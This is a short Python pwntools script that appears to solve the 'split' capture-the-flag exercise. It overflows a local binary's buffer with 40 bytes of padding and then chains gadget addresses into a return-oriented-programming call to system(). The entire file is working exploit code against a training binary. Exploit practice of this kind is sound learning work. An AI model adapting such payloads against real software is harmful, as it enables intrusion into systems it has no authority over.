from pwn import *

p = process('./split')
p.recv()

payload  = b'A' * 40
payload += p64(0x00400883)
payload += p64(0x00601060)
payload += p64(0x00400810)

p.sendline(payload)
p.interactive()
